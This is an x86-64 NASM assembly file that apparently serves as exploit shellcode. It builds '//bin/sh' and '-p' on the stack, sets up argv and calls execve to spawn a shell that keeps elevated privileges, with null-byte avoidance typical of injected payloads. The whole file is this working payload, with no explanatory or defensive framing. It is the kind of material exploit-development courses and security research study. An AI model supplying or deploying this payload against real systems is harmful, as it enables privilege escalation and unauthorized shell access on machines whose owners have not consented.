BITS 64

section .text
    global _start

_start:
    xor rax, rax

    ; BUILD STRINGS
    ; BUILD "-p"
    push rax                        ; NULL terminator
    push word "-p"                  ;
    mov rsi, rsp                    ; rsi (2nd argument, pointer to "-p")
    ; BUILD "//bin/sh"
    push rax                        ; NULL TERMINATOR
    mov rbx, "//bin/sh"             ; 8-bytes, loaded as 64 bits 
    push rbx                        ; save "//bin/sh" onto the stack
    mov rdi, rsp                    ; rdi (1st argument) = pointer to "/bin/sh"

    ; BUILD ARGV
    push rax;
    push rsi;
    push rdi;

    mov rsi, rsp; rsi (2nd) argument => pointer to argv

    xor rdx, rdx                    ; envp = NULL

    mov al, 0x3b                   ; syscall execve = 59
    syscall
